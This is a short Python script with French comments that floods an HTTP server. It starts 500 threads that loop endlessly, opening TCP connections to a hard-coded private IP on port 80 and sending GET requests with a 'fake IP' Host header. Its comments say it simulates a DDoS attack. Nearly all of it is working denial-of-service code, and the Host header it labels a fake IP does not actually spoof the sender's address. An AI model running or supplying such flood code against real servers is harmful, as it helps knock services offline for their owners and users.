import threading
import socket

# Cible
target = '192.168.100.9'  # IP cible
port = 80  # Port HTTP
fake_ip = '192.168.101.47'  # Fausse IP

alc=0#Variable qui compte le nombre de requêtes envoyées

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#Crée un nouveau socket pour envoyer des requêtes.
        """
        socket.AF_INET → Utilise IPv4 (si c'était AF_INET6, ce serait IPv6).
        socket.SOCK_STREAM → Utilise le protocole TCP (connexion stable).
        """
        
        try:#Essaye d'exécuter le code suivant (si une erreur survient, on passe au except).
            s.connect((target, port))# Se connecte à l’IP cible (target) sur le port 80 (port).
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))# Envoie une requête HTTP vers la cible
            s.sendto((f"Host: {fake_ip}\r\n\r\n").encode('ascii'), (target, port))
        except socket.error:
            print("Connexion échouée")
        s.close()

        global alc#utiliser la variable globale alc dans cette fonction attack
        alc+=1
        print(alc)

# Lancement de 500 threads pour simuler une attaque DDoS
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
